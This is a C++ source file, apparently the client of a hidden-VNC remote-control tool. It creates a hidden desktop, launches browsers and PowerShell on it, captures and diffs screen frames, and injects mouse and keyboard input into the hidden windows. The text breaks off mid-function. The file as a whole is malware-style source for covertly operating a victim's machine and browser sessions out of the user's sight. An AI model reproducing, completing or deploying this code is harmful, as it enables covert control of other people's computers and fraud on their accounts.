#include "Hd.h"
#include <windowsx.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <gdiplus.h>
#include <vector>
#include <limits.h>
#include "../common/ScreenTransfer/ScreenCodec.h"
#pragma comment (lib,"Gdiplus.Lib")
using namespace Gdiplus;

enum Connection { desktop, input };
enum Input { mouse };

struct InputMessage
{
    DWORD msg;
    DWORD wParam;
    DWORD lParam;
};

static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);
static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
static const DWORD    gc_frameIntervalMs = 33;
static const DWORD    gc_socketTimeoutMs = 5000;

enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE      *g_pixels = NULL;
static BYTE      *g_oldPixels = NULL;
static BYTE      *g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread;
static ULONG_PTR  g_gdiplusToken;
static BOOL       g_gdiplusStarted = FALSE;
static BOOL       g_lastCaptureFailed = FALSE;
static char       g_desktopName[MAX_PATH];
static HWND       g_lastInputHwnd = NULL;
static DWORD      g_lastDesktopDumpTick = 0;
static BOOL       g_dumpedInputDesktopState = FALSE;
static ULARGE_INTEGER lisize;
static LARGE_INTEGER offset;

static const char *InputMsgName(UINT msg)
{
    switch (msg)
    {
    case WM_LBUTTONDOWN: return "WM_LBUTTONDOWN";
    case WM_LBUTTONUP: return "WM_LBUTTONUP";
    case WM_RBUTTONDOWN: return "WM_RBUTTONDOWN";
    case WM_RBUTTONUP: return "WM_RBUTTONUP";
    case WM_MBUTTONDOWN: return "WM_MBUTTONDOWN";
    case WM_MBUTTONUP: return "WM_MBUTTONUP";
    case WM_LBUTTONDBLCLK: return "WM_LBUTTONDBLCLK";
    case WM_RBUTTONDBLCLK: return "WM_RBUTTONDBLCLK";
    case WM_MBUTTONDBLCLK: return "WM_MBUTTONDBLCLK";
    case WM_MOUSEMOVE: return "WM_MOUSEMOVE";
    case WM_MOUSEWHEEL: return "WM_MOUSEWHEEL";
    case WM_CHAR: return "WM_CHAR";
    case WM_KEYDOWN: return "WM_KEYDOWN";
    case WM_KEYUP: return "WM_KEYUP";
    case WM_SYSCHAR: return "WM_SYSCHAR";
    case WM_SYSKEYDOWN: return "WM_SYSKEYDOWN";
    case WM_SYSKEYUP: return "WM_SYSKEYUP";
    default: return "UNKNOWN";
    }
}

static HWND GetTopLevelWindow(HWND hWnd)
{
    if (!hWnd)
        return NULL;

    HWND topHwnd = hWnd;
    while ((GetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
    {
        HWND parent = GetParent(topHwnd);
        if (!parent)
            break;
        topHwnd = parent;
    }
    return topHwnd;
}

static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *title, int titleSize)
{
    if (classNameSize > 0)
        className[0] = 0;
    if (titleSize > 0)
        title[0] = 0;

    if (!hWnd)
        return;

    GetClassNameA(hWnd, className, classNameSize);
    GetWindowTextA(hWnd, title, titleSize);
}

static BOOL GetDesktopNameA(HDESK hDesk, char *name, DWORD nameSize)
{
    if (nameSize)
        name[0] = 0;
    if (!hDesk || !name || !nameSize)
        return FALSE;

    DWORD needed = 0;
    if (!GetUserObjectInformationA(hDesk, UOI_NAME, name, nameSize, &needed))
    {
        if (nameSize)
            name[0] = 0;
        return FALSE;
    }
    return TRUE;
}

static void GetProcessImageNameA(DWORD pid, char *image, DWORD imageSize)
{
    if (imageSize)
        image[0] = 0;
    if (!pid || !image || !imageSize)
        return;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess)
        return;

    DWORD size = imageSize;
    QueryFullProcessImageNameA(hProcess, 0, image, &size);
    CloseHandle(hProcess);
}

static DWORD GetProcessIntegrityRid(DWORD pid)
{
    DWORD rid = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess)
        return 0;

    HANDLE hToken = NULL;
    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        DWORD needed = 0;
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &needed);
        if (needed)
        {
            PTOKEN_MANDATORY_LABEL label = (PTOKEN_MANDATORY_LABEL)Alloc(needed);
            if (label && GetTokenInformation(hToken, TokenIntegrityLevel, label, needed, &needed))
            {
                DWORD subAuthorityCount = *GetSidSubAuthorityCount(label->Label.Sid);
                rid = *GetSidSubAuthority(label->Label.Sid, subAuthorityCount - 1);
            }
            Funcs::pFree(label);
        }
        CloseHandle(hToken);
    }

    CloseHandle(hProcess);
    return rid;
}

static void LogDesktopState(const char *stage)
{
    char threadDesktopName[128] = { 0 };
    char hiddenDesktopName[128] = { 0 };
    char inputDesktopName[128] = { 0 };
    HDESK threadDesktop = GetThreadDesktop(GetCurrentThreadId());
    HDESK inputDesktop = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP);
    DWORD inputDesktopError = 0;

    if (!inputDesktop)
        inputDesktopError = GetLastError();

    GetDesktopNameA(threadDesktop, threadDesktopName, sizeof(threadDesktopName));
    GetDesktopNameA(g_hDesk, hiddenDesktopName, sizeof(hiddenDesktopName));
    if (inputDesktop)
        GetDesktopNameA(inputDesktop, inputDesktopName, sizeof(inputDesktopName));

    printf("[diag] desktop-state %s threadDesk=0x%p('%s') hiddenDesk=0x%p('%s') inputDesk=0x%p('%s') inputDeskErr=%lu sameThreadHidden=%d sameThreadInput=%d\n",
        stage,
        threadDesktop,
        threadDesktopName,
        g_hDesk,
        hiddenDesktopName,
        inputDesktop,
        inputDesktopName,
        inputDesktopError,
        threadDesktop == g_hDesk,
        inputDesktop && threadDesktop == inputDesktop);

    if (inputDesktop)
        CloseDesktop(inputDesktop);
}

static void LogWindowDetails(const char *stage, HWND hWnd)
{
    if (!hWnd)
    {
        printf("[diag] window-detail %s hwnd=NULL\n", stage);
        return;
    }

    char className[128] = { 0 };
    char title[128] = { 0 };
    char image[MAX_PATH] = { 0 };
    RECT rect = { 0 };
    DWORD pid = 0;
    DWORD tid = GetWindowThreadProcessId(hWnd, &pid);
    DWORD style = (DWORD)GetWindowLongPtrA(hWnd, GWL_STYLE);
    DWORD exStyle = (DWORD)GetWindowLongPtrA(hWnd, GWL_EXSTYLE);
    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
    GetWindowRect(hWnd, &rect);
    GetProcessImageNameA(pid, image, sizeof(image));
    DWORD ilRid = GetProcessIntegrityRid(pid);

    printf("[diag] window-detail %s hwnd=0x%p class='%s' title='%s' pid=%lu tid=%lu ilRid=0x%lx visible=%d enabled=%d style=0x%lx exStyle=0x%lx rect=(%ld,%ld,%ld,%ld) exe='%s'\n",
        stage,
        hWnd,
        className,
        title,
        pid,
        tid,
        ilRid,
        IsWindowVisible(hWnd),
        IsWindowEnabled(hWnd),
        style,
        exStyle,
        rect.left,
        rect.top,
        rect.right,
        rect.bottom,
        image);
}

static BOOL CALLBACK LogDesktopWindowProc(HWND hWnd, LPARAM lParam)
{
    int *count = (int *)lParam;
    if (*count >= 40)
        return FALSE;

    char stage[64];
    wsprintfA(stage, "enum[%02d]", *count);
    LogWindowDetails(stage, hWnd);
    ++(*count);
    return TRUE;
}

static void DumpHiddenDesktopWindows(const char *reason)
{
    DWORD now = GetTickCount();
    if (g_lastDesktopDumpTick && now - g_lastDesktopDumpTick < 10000)
        return;
    g_lastDesktopDumpTick = now;

    printf("[diag] hidden-desktop-window-dump reason=%s\n", reason ? reason : "unknown");
    LogDesktopState("dump");
    int count = 0;
    if (!EnumDesktopWindows(g_hDesk, LogDesktopWindowProc, (LPARAM)&count))
        printf("[diag] EnumDesktopWindows failed: GetLastError=%lu\n", GetLastError());
    printf("[diag] hidden-desktop-window-dump count=%d\n", count);
}

static BOOL IsExcludedInputClass(const char *className)
{
    if (!className || !className[0])
        return FALSE;

    return !lstrcmpiA(className, "UserOOBEWindowClass") ||
        !lstrcmpiA(className, "tooltips_class32") ||
        !lstrcmpiA(className, "IME") ||
        !lstrcmpiA(className, "MSCTFIME UI") ||
        !lstrcmpiA(className, "SysShadow");
}

struct HitTestContext
{
    POINT point;
    HWND bestHwnd;
    LONG bestArea;
};

static BOOL IsWindowCandidateAtPoint(HWND hWnd, POINT point, RECT *outRect, char *outClassName, DWORD classNameSize)
{
    if (!hWnd || !IsWindowVisible(hWnd) || !IsWindowEnabled(hWnd))
        return FALSE;

    RECT rect = { 0 };
    if (!GetWindowRect(hWnd, &rect) || rect.right <= rect.left || rect.bottom <= rect.top)
        return FALSE;
    if (!PtInRect(&rect, point))
        return FALSE;

    char className[128] = { 0 };
    GetClassNameA(hWnd, className, sizeof(className));
    if (IsExcludedInputClass(className))
        return FALSE;

    if (outRect)
        *outRect = rect;
    if (outClassName && classNameSize)
        lstrcpynA(outClassName, className, classNameSize);
    return TRUE;
}

static BOOL CALLBACK HiddenDesktopHitTestEnumProc(HWND hWnd, LPARAM lParam)
{
    HitTestContext *ctx = (HitTestContext *)lParam;
    RECT rect = { 0 };
    if (!IsWindowCandidateAtPoint(hWnd, ctx->point, &rect, NULL, 0))
        return TRUE;

    LONG area = (rect.right - rect.left) * (rect.bottom - rect.top);
    if (!ctx->bestHwnd || area < ctx->bestArea)
    {
        ctx->bestHwnd = hWnd;
        ctx->bestArea = area;
    }
    return TRUE;
}

static HWND FindChildInputTarget(HWND hWnd, POINT screenPoint)
{
    HWND current = hWnd;
    for (int depth = 0; current && depth < 16; ++depth)
    {
        POINT clientPoint = screenPoint;
        if (!ScreenToClient(current, &clientPoint))
            break;

        HWND child = ChildWindowFromPointEx(current, clientPoint, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
        if (!child || child == current)
            break;

        char className[128] = { 0 };
        GetClassNameA(child, className, sizeof(className));
        if (IsExcludedInputClass(className))
            break;
        current = child;
    }
    return current ? current : hWnd;
}

static HWND FindHiddenDesktopWindowFromPoint(POINT point)
{
    HitTestContext ctx = { 0 };
    ctx.point = point;
    ctx.bestHwnd = NULL;
    ctx.bestArea = LONG_MAX;

    SetLastError(0);
    if (!EnumDesktopWindows(g_hDesk, HiddenDesktopHitTestEnumProc, (LPARAM)&ctx))
        printf("[input] EnumDesktopWindows hit-test failed: lastError=%lu\n", GetLastError());

    HWND selected = ctx.bestHwnd;
    if (!selected)
    {
        selected = WindowFromPoint(point);
        LogWindowDetails("hit-test-windowfrompoint-fallback", selected);
    }

    if (selected)
        selected = FindChildInputTarget(selected, point);

    return selected;
}

static BOOL IsMoveResizeHit(LRESULT hitTest)
{
    switch (hitTest)
    {
    case HTCAPTION:
    case HTTOP:
    case HTBOTTOM:
    case HTLEFT:
    case HTRIGHT:
    case HTTOPLEFT:
    case HTTOPRIGHT:
    case HTBOTTOMLEFT:
    case HTBOTTOMRIGHT:
        return TRUE;
    default:
        return FALSE;
    }
}

static HWND GetMovableTopWindow(HWND hWnd)
{
    HWND topHwnd = GetTopLevelWindow(hWnd);
    return topHwnd ? topHwnd : hWnd;
}

static BOOL ShouldLogInput(UINT msg)
{
    static DWORD moveCount = 0;
    if (msg == WM_MOUSEMOVE)
    {
        ++moveCount;
        return (moveCount % 60) == 1;
    }
    return TRUE;
}

static void LogInputTarget(const char *stage, UINT msg, HWND hWnd, POINT screenPoint, POINT clientPoint, BOOL result)
{
    char className[128];
    char title[128];
    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
    printf("[input] %s %s hwnd=0x%p class='%s' title='%s' screen=(%ld,%ld) client=(%ld,%ld) result=%s lastError=%lu\n",
        stage,
        InputMsgName(msg),
        hWnd,
        className,
        title,
        screenPoint.x,
        screenPoint.y,
        clientPoint.x,
        clientPoint.y,
        result ? "ok" : "failed",
        GetLastError());
}

static BOOL IsModifierVk(WPARAM vk)
{
    return vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
        vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
        vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_LWIN || vk == VK_RWIN;
}

static BOOL IsPhysicalKeyVk(WPARAM vk)
{
    if (IsModifierVk(vk))
        return TRUE;
    if (vk >= VK_F1 && vk <= VK_F24)
        return TRUE;

    switch (vk)
    {
    case VK_BACK:
    case VK_TAB:
    case VK_RETURN:
    case VK_ESCAPE:
    case VK_PRIOR:
    case VK_NEXT:
    case VK_END:
    case VK_HOME:
    case VK_LEFT:
    case VK_UP:
    case VK_RIGHT:
    case VK_DOWN:
    case VK_INSERT:
    case VK_DELETE:
    case VK_SNAPSHOT:
    case VK_APPS:
        return TRUE;
    default:
        return FALSE;
    }
}

static BOOL HasModifierDown(const BOOL keyDown[256])
{
    return keyDown[VK_SHIFT] || keyDown[VK_LSHIFT] || keyDown[VK_RSHIFT] ||
        keyDown[VK_CONTROL] || keyDown[VK_LCONTROL] || keyDown[VK_RCONTROL] ||
        keyDown[VK_MENU] || keyDown[VK_LMENU] || keyDown[VK_RMENU] ||
        keyDown[VK_LWIN] || keyDown[VK_RWIN];
}

static void UpdateKeyStateCache(UINT msg, WPARAM vk, BOOL keyDown[256])
{
    if (vk >= 256)
        return;

    if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
        keyDown[vk] = TRUE;
    else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
        keyDown[vk] = FALSE;
}

static void TryActivateInputTarget(HWND hWnd, UINT msg)
{
    if (!hWnd)
        return;

    HWND topHwnd = GetTopLevelWindow(hWnd);
    DWORD currentThread = GetCurrentThreadId();
    DWORD targetThread = GetWindowThreadProcessId(hWnd, NULL);
    BOOL attached = FALSE;

    if (targetThread && targetThread != currentThread)
        attached = AttachThreadInput(currentThread, targetThread, TRUE);

    SetLastError(0);
    BOOL bringResult = topHwnd ? BringWindowToTop(topHwnd) : FALSE;
    BOOL foregroundResult = topHwnd ? SetForegroundWindow(topHwnd) : FALSE;
    HWND activeResult = topHwnd ? SetActiveWindow(topHwnd) : NULL;
    HWND focusResult = SetFocus(hWnd);

    if (ShouldLogInput(msg))
    {
        char className[128];
        char title[128];
        DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
        printf("[input] activate %s target=0x%p top=0x%p class='%s' title='%s' attach=%d bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
            InputMsgName(msg),
            hWnd,
            topHwnd,
            className,
            title,
            attached,
            bringResult,
            foregroundResult,
            activeResult,
            focusResult,
            GetLastError());
    }

    if (attached)
        AttachThreadInput(currentThread, targetThread, FALSE);
}

static DWORD MouseFlagsForMessage(UINT msg)
{
    switch (msg)
    {
    case WM_LBUTTONDOWN: return MOUSEEVENTF_LEFTDOWN;
    case WM_LBUTTONUP: return MOUSEEVENTF_LEFTUP;
    case WM_LBUTTONDBLCLK: return MOUSEEVENTF_LEFTDOWN;
    case WM_RBUTTONDOWN: return MOUSEEVENTF_RIGHTDOWN;
    case WM_RBUTTONUP: return MOUSEEVENTF_RIGHTUP;
    case WM_RBUTTONDBLCLK: return MOUSEEVENTF_RIGHTDOWN;
    case WM_MBUTTONDOWN: return MOUSEEVENTF_MIDDLEDOWN;
    case WM_MBUTTONUP: return MOUSEEVENTF_MIDDLEUP;
    case WM_MBUTTONDBLCLK: return MOUSEEVENTF_MIDDLEDOWN;
    case WM_MOUSEWHEEL: return MOUSEEVENTF_WHEEL;
    default: return 0;
    }
}

static BOOL InjectMouseInput(UINT msg, WPARAM wParam, LPARAM lParam, POINT screenPoint)
{
    SetLastError(0);
    BOOL moved = SetCursorPos(screenPoint.x, screenPoint.y);
    DWORD moveError = GetLastError();
    DWORD flags = MouseFlagsForMessage(msg);
    if (msg == WM_MOUSEMOVE)
    {
        if (!moved)
            printf("[input] SetCursorPos failed for mousemove screen=(%ld,%ld) lastError=%lu\n", screenPoint.x, screenPoint.y, moveError);
        return moved;
    }
    if (!flags)
        return FALSE;

    INPUT inputEvent = { 0 };
    inputEvent.type = INPUT_MOUSE;
    inputEvent.mi.dwFlags = flags;
    if (msg == WM_MOUSEWHEEL)
        inputEvent.mi.mouseData = GET_WHEEL_DELTA_WPARAM(wParam);

    SetLastError(0);
    UINT sent = SendInput(1, &inputEvent, sizeof(inputEvent));
    DWORD sendError = GetLastError();
    if (!moved || sent != 1)
        printf("[input] mouse-inject-detail %s moved=%d moveErr=%lu sendInput=%u sendErr=%lu screen=(%ld,%ld)\n",
            InputMsgName(msg), moved, moveError, sent, sendError, screenPoint.x, screenPoint.y);
    if (sent == 1 && (msg == WM_LBUTTONDBLCLK || msg == WM_RBUTTONDBLCLK || msg == WM_MBUTTONDBLCLK))
    {
        INPUT upEvent = inputEvent;
        if (msg == WM_LBUTTONDBLCLK)
            upEvent.mi.dwFlags = MOUSEEVENTF_LEFTUP;
        else if (msg == WM_RBUTTONDBLCLK)
            upEvent.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
        else
            upEvent.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
        SendInput(1, &upEvent, sizeof(upEvent));
    }
    return sent == 1;
}

static BOOL InjectVirtualKey(UINT msg, WPARAM vk)
{
    if (vk == 0 || vk >= 256)
        return FALSE;

    INPUT inputEvent = { 0 };
    inputEvent.type = INPUT_KEYBOARD;
    inputEvent.ki.wVk = (WORD)vk;
    if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
        inputEvent.ki.dwFlags = KEYEVENTF_KEYUP;

    SetLastError(0);
    return SendInput(1, &inputEvent, sizeof(inputEvent)) == 1;
}

static BOOL InjectUnicodeChar(WPARAM ch)
{
    if (ch == 0 || ch > 0xFFFF)
        return FALSE;

    INPUT inputEvents[2] = { 0 };
    inputEvents[0].type = INPUT_KEYBOARD;
    inputEvents[0].ki.wScan = (WORD)ch;
    inputEvents[0].ki.dwFlags = KEYEVENTF_UNICODE;
    inputEvents[1] = inputEvents[0];
    inputEvents[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;

    SetLastError(0);
    return SendInput(2, inputEvents, sizeof(INPUT)) == 2;
}

static void FreePixelBuffers()
{
    Funcs::pFree(g_pixels);
    Funcs::pFree(g_oldPixels);
    Funcs::pFree(g_tempPixels);
    g_pixels = NULL;
    g_oldPixels = NULL;
    g_tempPixels = NULL;
}

static BOOL BitmapToJpg(HDC hDc, HBITMAP hBmpImage, int height)
{
    BOOL ret = FALSE;
    HBITMAP hBmpCopy = NULL;
    IStream *jpegStream = NULL;
    Bitmap *image = NULL;
    Bitmap *jpeg = NULL;
    HBITMAP compressedImage = NULL;
    LARGE_INTEGER streamOffset = { 0 };

    if (!g_gdiplusStarted)
        goto exit;

    // FromHBITMAP rejects bitmaps that are or were selected into a DC
    hBmpCopy = (HBITMAP)CopyImage(hBmpImage, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
    if (!hBmpCopy)
        goto exit;

    if (CreateStreamOnHGlobal(NULL, TRUE, &jpegStream) != S_OK || !jpegStream)
        goto exit;

    image = Bitmap::FromHBITMAP(hBmpCopy, NULL);
    if (!image || image->GetLastStatus() != Ok)
        goto exit;

    if (image->Save(jpegStream, &jpegID, NULL) != Ok)
        goto exit;

    if (jpegStream->Seek(streamOffset, STREAM_SEEK_SET, NULL) != S_OK)
        goto exit;

    jpeg = Bitmap::FromStream(jpegStream);
    if (!jpeg || jpeg->GetLastStatus() != Ok)
        goto exit;

    if (jpeg->GetHBITMAP(Color::White, &compressedImage) != Ok)
        goto exit;

    if (Funcs::pGetDIBits(hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO *)&g_bmpInfo, DIB_RGB_COLORS) != height)
        goto exit;

    ret = TRUE;

exit:
    if (compressedImage)
        Funcs::pDeleteObject(compressedImage);
    delete jpeg;
    delete image;
    if (hBmpCopy)
        Funcs::pDeleteObject(hBmpCopy);
    if (jpegStream)
        jpegStream->Release();
    return ret;
}

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
    BOOL ret = FALSE;
    RECT rect;
    Funcs::pGetWindowRect(hWnd, &rect);

    HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
    HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
    HGDIOBJ hOldBmpWindow = NULL;
    if (!hDcWindow || !hBmpWindow)
        goto exit;

    hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
    if (!hOldBmpWindow)
        goto exit;
    if (Funcs::pPrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT))
    {
        Funcs::pBitBlt(hDcScreen,
            rect.left,
            rect.top,
            rect.right - rect.left,
            rect.bottom - rect.top,
            hDcWindow,
            0,
            0,
            SRCCOPY);

        ret = TRUE;
    }
    Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
exit:
    if (hBmpWindow)
        Funcs::pDeleteObject(hBmpWindow);
    if (hDcWindow)
        Funcs::pDeleteDC(hDcWindow);
    return ret;
}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
    HWND currentWindow = Funcs::pGetTopWindow(owner);
    if (currentWindow == NULL)
        return;
    if ((currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDLAST)) == NULL)
        return;
    while (proc(currentWindow, param) && (currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

struct EnumHwndsPrintData
{
    HDC hDc;
    HDC hDcScreen;
};

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
    EnumHwndsPrintData *data = (EnumHwndsPrintData *)lParam;

    if (!Funcs::pIsWindowVisible(hWnd))
        return TRUE;

    PaintWindow(hWnd, data->hDc, data->hDcScreen);

    OSVERSIONINFO versionInfo;
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    Funcs::pGetVersionExA(&versionInfo);
    if (versionInfo.dwMajorVersion < 6)
        EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
    return TRUE;
}

// Returns TRUE when there is no frame to send: unchanged pixels or capture failure
static BOOL GetDeskPixels(int serverWidth, int serverHeight)
{
    BOOL captureSuccess = FALSE;
    BOOL comparePixels = TRUE;
    HDC hDc = NULL;
    HDC hDcScreen = NULL;
    HDC hDcScreenResized = NULL;
    HBITMAP hBmpScreen = NULL;
    HBITMAP hBmpScreenResized = NULL;
    HGDIOBJ hOldBmpScreen = NULL;
    HGDIOBJ hOldBmpScreenResized = NULL;
    EnumHwndsPrintData data;
    RECT rect;
    HWND hWndDesktop = Funcs::pGetDesktopWindow();
    Funcs::pGetWindowRect(hWndDesktop, &rect);

    g_lastCaptureFailed = FALSE;

    if (serverWidth <= 0 || serverHeight <= 0 || rect.right <= 0 || rect.bottom <= 0)
        goto cleanup;

    hDc = Funcs::pGetDC(NULL);
    if (!hDc)
        goto cleanup;

    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
    if (!hDcScreen)
        goto cleanup;

    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
    if (!hBmpScreen)
        goto cleanup;

    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
    if (!hOldBmpScreen)
        goto cleanup;

    data.hDc = hDc;
    data.hDcScreen = hDcScreen;

    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

    if (serverWidth > rect.right)
        serverWidth = rect.right;
    if (serverHeight > rect.bottom)
        serverHeight = rect.bottom;

    if (serverWidth != rect.right || serverHeight != rect.bottom)
    {
        hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
        if (!hBmpScreenResized)
            goto cleanup;

        hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);
        if (!hDcScreenResized)
            goto cleanup;

        hOldBmpScreenResized = Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
        if (!hOldBmpScreenResized)
            goto cleanup;
        Funcs::pSetStretchBltMode(hDcScreenResized, HALFTONE);
        if (!Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
            hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY))
        {
            goto cleanup;
        }

        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
        hOldBmpScreen = NULL;
        Funcs::pDeleteObject(hBmpScreen);
        Funcs::pDeleteDC(hDcScreen);

        hBmpScreen = hBmpScreenResized;
        hDcScreen = hDcScreenResized;
        hOldBmpScreen = hOldBmpScreenResized;
        hBmpScreenResized = NULL;
        hDcScreenResized = NULL;
        hOldBmpScreenResized = NULL;
    }

    g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

    if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
    {
        FreePixelBuffers();

        g_pixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_oldPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_tempPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);

        comparePixels = FALSE;
        if (!g_pixels || !g_oldPixels || !g_tempPixels)
        {
            FreePixelBuffers();
            goto cleanup;
        }
    }

    g_bmpInfo.bmiHeader.biWidth = serverWidth;
    g_bmpInfo.bmiHeader.biHeight = serverHeight;

    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    hOldBmpScreen = NULL;

    // Use raw pixels directly. The previous JPEG round-trip was very expensive and
    // caused visible input lag before the frame was compressed for transport.
    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
        captureSuccess = TRUE;

cleanup:
    if (hOldBmpScreenResized && hDcScreenResized)
        Funcs::pSelectObject(hDcScreenResized, hOldBmpScreenResized);
    if (hBmpScreenResized)
        Funcs::pDeleteObject(hBmpScreenResized);
    if (hDcScreenResized)
        Funcs::pDeleteDC(hDcScreenResized);

    if (hOldBmpScreen && hDcScreen)
        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    if (hBmpScreen)
        Funcs::pDeleteObject(hBmpScreen);
    if (hDc)
        Funcs::pReleaseDC(NULL, hDc);
    if (hDcScreen)
        Funcs::pDeleteDC(hDcScreen);

    if (!captureSuccess)
    {
        g_bmpInfo.bmiHeader.biWidth = 0;
        g_bmpInfo.bmiHeader.biHeight = 0;
        g_lastCaptureFailed = TRUE;
        // Treat a failed capture as an unchanged frame so the caller skips it
        return TRUE;
    }

    if (comparePixels)
    {
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
        {
            if (g_pixels[i] == GetRValue(gc_trans) &&
                g_pixels[i + 1] == GetGValue(gc_trans) &&
                g_pixels[i + 2] == GetBValue(gc_trans))
            {
                ++g_pixels[i + 1];
            }
        }

        Funcs::pMemcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);

        BOOL same = TRUE;
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
        {
            if (g_pixels[i] == g_oldPixels[i] &&
                g_pixels[i + 1] == g_oldPixels[i + 1] &&
                g_pixels[i + 2] == g_oldPixels[i + 2])
            {
                g_pixels[i] = GetRValue(gc_trans);
                g_pixels[i + 1] = GetGValue(gc_trans);
                g_pixels[i + 2] = GetBValue(gc_trans);
            }
            else
                same = FALSE;
        }
        if (same)
            return TRUE;

        Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
    }
    else
        Funcs::pMemcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
    return FALSE;
}

static BOOL CaptureDesktopFrame(screen2::RawFrame& frame)
{
    BOOL captureSuccess = FALSE;
    HDC hDc = NULL;
    HDC hDcScreen = NULL;
    HBITMAP hBmpScreen = NULL;
    HGDIOBJ hOldBmpScreen = NULL;
    EnumHwndsPrintData data;
    RECT rect;
    HWND hWndDesktop = Funcs::pGetDesktopWindow();

    frame = screen2::RawFrame();
    Funcs::pGetWindowRect(hWndDesktop, &rect);
    if (rect.right <= rect.left || rect.bottom <= rect.top)
        goto cleanup;

    hDc = Funcs::pGetDC(NULL);
    if (!hDc)
        goto cleanup;

    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
    if (!hDcScreen)
        goto cleanup;

    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
    if (!hBmpScreen)
        goto cleanup;

    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
    if (!hOldBmpScreen)
        goto cleanup;

    data.hDc = hDc;
    data.hDcScreen = hDcScreen;
    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

    frame.virtualX = rect.left;
    frame.virtualY = rect.top;
    frame.screenWidth = rect.right - rect.left;
    frame.screenHeight = rect.bottom - rect.top;
    frame.width = frame.screenWidth;
    frame.height = frame.screenHeight;
    frame.stride = screen2::CalcStride24(frame.width);
    frame.pixels.assign(static_cast<size_t>(frame.stride) * frame.height, 0);

    BITMAPINFO topDownInfo;
    Funcs::pMemset(&topDownInfo, 0, sizeof(topDownInfo));
